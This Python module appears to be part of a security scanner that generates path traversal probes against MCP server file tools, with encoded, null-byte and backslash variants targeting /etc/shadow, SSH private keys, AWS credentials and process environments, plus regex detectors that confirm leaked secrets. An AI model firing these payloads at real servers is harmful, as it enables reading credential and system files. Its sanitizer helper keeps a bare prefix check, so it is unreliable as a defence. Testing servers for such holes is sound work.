"""
EP-T14 — Path Traversal via Prefix String Bypass.

Based on CVE-2025-53110 and related prefix validation vulnerabilities.

Many MCP servers validate file paths by checking for an allowed prefix:
    if not path.startswith(ALLOWED_BASE): raise PermissionError()

The bypass: Python/Node resolve paths AFTER the prefix check.
    Allowed: /workspace
    Payload: /workspace/../../../etc/passwd
    Check:   startswith('/workspace') → True (passes!)
    Resolved: /etc/passwd (traversal succeeds)

Variant patterns:
  - Double-dot traversal:    /allowed/../../../etc/passwd
  - URL encoding:            /allowed/%2e%2e/%2e%2e/etc/passwd
  - Null byte termination:   /allowed/\x00/../../../etc/passwd
  - Unicode dots:            /allowed/\u002e\u002e/etc/passwd
  - Mixed slash:             /allowed/..\\/..\\etc\\passwd
  - Symlink chase:           /allowed -> /tmp/link -> /etc/passwd

Target surfaces:
  - Any MCP tool that accepts a file path parameter
  - Tools: read_file, write_file, list_directory, open, load, import
  - Resources: URI-based access with path components
"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass
from pathlib import PurePosixPath
from typing import Optional


@dataclass
class TraversalProbe:
    probe_id:     str
    variant:      str
    base_path:    str        # the "allowed" prefix
    payload:      str        # the full path with traversal attempt
    target:       str        # what we're trying to reach
    severity:     str = "HIGH"


def build_traversal_probes(
    allowed_base: str = "/workspace",
    targets: Optional[list[str]] = None,
) -> list[TraversalProbe]:
    """Generate all EP-T14 traversal probes for a given allowed base path."""
    if targets is None:
        targets = [
            "/etc/passwd",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "~/.aws/credentials",
            "~/.env",
            "/proc/self/environ",
        ]

    probes = []
    base = allowed_base.rstrip("/")

    for target in targets:
        # 1. Classic double-dot
        depth = len([p for p in base.split("/") if p]) + 2
        dots = "/".join([".."] * depth)
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-01-dotdot-{target.replace('/','_')}",
            variant="classic_dotdot",
            base_path=base,
            payload=f"{base}/{dots}{target}",
            target=target,
            severity="CRITICAL" if "passwd" in target or "id_rsa" in target else "HIGH",
        ))

        # 2. URL-encoded dots
        encoded = f"{base}/%2e%2e/%2e%2e/%2e%2e{target}"
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-02-urlencode-{target.replace('/','_')}",
            variant="url_encoded",
            base_path=base,
            payload=encoded,
            target=target,
        ))

        # 3. Unicode dots (\u002e = '.')
        uni = f"{base}/\u002e\u002e/\u002e\u002e/\u002e\u002e{target}"
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-03-unicode-{target.replace('/','_')}",
            variant="unicode_dots",
            base_path=base,
            payload=uni,
            target=target,
        ))

        # 4. Null byte termination — bypass startswith() check
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-04-nullbyte-{target.replace('/','_')}",
            variant="null_byte",
            base_path=base,
            payload=f"{base}\x00{target}",
            target=target,
        ))

        # 5. Double URL encoding (%252e%252e)
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-05-double-encode-{target.replace('/','_')}",
            variant="double_url_encoded",
            base_path=base,
            payload=f"{base}/%252e%252e/%252e%252e{target}",
            target=target,
        ))

        # 6. Backslash mixed (Windows SDK on Linux edge case)
        probes.append(TraversalProbe(
            probe_id=f"EP-T14-06-backslash-{target.replace('/','_')}",
            variant="backslash_mixed",
            base_path=base,
            payload=f"{base}\\..\\..\\..{target.replace('/','/')}",
            target=target,
        ))

    return probes


_TRAVERSAL_SUCCESS_PATTERNS = [
    re.compile(r"root:[x*]:\d+:\d+:", re.MULTILINE),   # /etc/passwd (Linux+macOS)
    re.compile(r"-----BEGIN.*PRIVATE KEY", re.DOTALL),  # SSH key
    re.compile(r"aws_access_key_id", re.I),              # AWS creds
    re.compile(r"\[default\]", re.M),                   # credential file sections
    re.compile(r"HOME=|PATH=|USER="),                   # /proc/self/environ
    re.compile(r"ARGUS_INJECT_BEACON"),                 # beacon in path context
]


def detect_traversal_success(response_text: str) -> tuple[bool, str]:
    """Detect if path traversal succeeded by scanning the response."""
    for pat in _TRAVERSAL_SUCCESS_PATTERNS:
        m = pat.search(response_text)
        if m:
            return True, f"Traversal proof: {m.group(0)[:80]!r}"
    return False, ""


def is_traversal_sanitized(path: str, allowed_base: str) -> bool:
    """Check if a path is properly sanitized (for defensive validation testing)."""
    try:
        _resolved = str(PurePosixPath(path).resolve())
        decoded = urllib.parse.unquote(path)
        normalized = str(PurePosixPath(decoded))
        return (
            normalized.startswith(allowed_base)
            and "\x00" not in path
            and ".." not in PurePosixPath(path).parts
        )
    except Exception:
        return False

# ── Double-normalization specific detection ───────────────────────────────────

_DOUBLE_NORM_BREAKOUT_PATTERNS = [
    # Tier 0: file contents returned = environment breakout confirmed
    re.compile(r"root:[x*]:\d+:\d+:", re.MULTILINE),    # /etc/passwd
    re.compile(r"-----BEGIN.*PRIVATE KEY", re.DOTALL),   # SSH key
    re.compile(r"aws_access_key_id\s*=", re.I),          # AWS creds
    re.compile(r"\[default\].*aws_", re.DOTALL | re.I),  # .aws/credentials
    re.compile(r"PATH=.*HOME=", re.I),                   # /proc/self/environ
    re.compile(r"ARGUS_INJECT_BEACON_\d+"),              # beacon via path param
]

_DOUBLE_NORM_FILTER_BYPASS = [
    # Host filtered %2e%2e but let %252e%252e through
    re.compile(r"(?i)path.*not.*allow|access.*denied|forbidden", re.I),
]


def detect_double_normalization(
    response_text: str,
    probe_variant: str,
    single_encoded_blocked: bool = False,
) -> tuple[bool, str, bool]:
    """Detect double-normalization bypass in probe response.

    Returns (breakout_confirmed, evidence, is_tier0).
    is_tier0=True means host-level environment breakout.
    single_encoded_blocked: True if %2e%2e was blocked but %252e%252e was tried.
    """
    # Check for actual file content = Tier 0 breakout
    for pat in _DOUBLE_NORM_BREAKOUT_PATTERNS:
        m = pat.search(response_text)
        if m:
            proof = m.group(0)[:120]
            is_t0 = (
                "root:" in proof or
                "PRIVATE KEY" in proof or
                "aws" in proof.lower() or
                "id_rsa" in proof.lower()
            )
            return True, (
                f"DOUBLE-NORMALIZATION BREAKOUT ({probe_variant}): "
                f"host decoded %25 then server decoded %2e — "
                f"traversal succeeded. Proof: {proof!r}"
            ), is_t0

    # Double normalization confirmed if single was blocked but double passed
    if single_encoded_blocked and probe_variant == "double_url_encoded":
        if not any(pat.search(response_text) for pat in _DOUBLE_NORM_FILTER_BYPASS):
            if len(response_text.strip()) > 20:
                return True, (
                    "Double-normalization filter bypass: %2e%2e blocked "
                    "but %252e%252e returned content"
                ), False

    return False, "", False


def build_double_norm_probe_matrix(
    allowed_base: str = "/workspace",
) -> list[dict]:
    """Build the complete double-normalization test matrix.
    Tests all encoding layers systematically."""
    targets = [
        "/etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "~/.aws/credentials",
    ]
    matrix = []
    base = allowed_base.rstrip("/")
    _depth = len([p for p in base.split("/") if p]) + 2
    for target in targets:
        matrix.extend([
            # Layer 1: host decodes, passes to server raw
            {"variant": "single_%2e",
             "payload": f"{base}/%2e%2e/%2e%2e/{target.lstrip('/')}",
             "encoding_depth": 1},
            # Layer 2: host decodes %25→%, server sees %2e%2e→..
            {"variant": "double_%252e",
             "payload": f"{base}/%252e%252e/%252e%252e/{target.lstrip('/')}",
             "encoding_depth": 2},
            # Layer 3: triple encoding
            {"variant": "triple_%25252e",
             "payload": f"{base}/%25252e%25252e/%25252e%25252e/{target.lstrip('/')}",
             "encoding_depth": 3},
            # Mixed: first segment single, second double
            {"variant": "mixed_encoding",
             "payload": f"{base}/%2e%2e/%252e%252e/{target.lstrip('/')}",
             "encoding_depth": "mixed"},
        ])
    return matrix
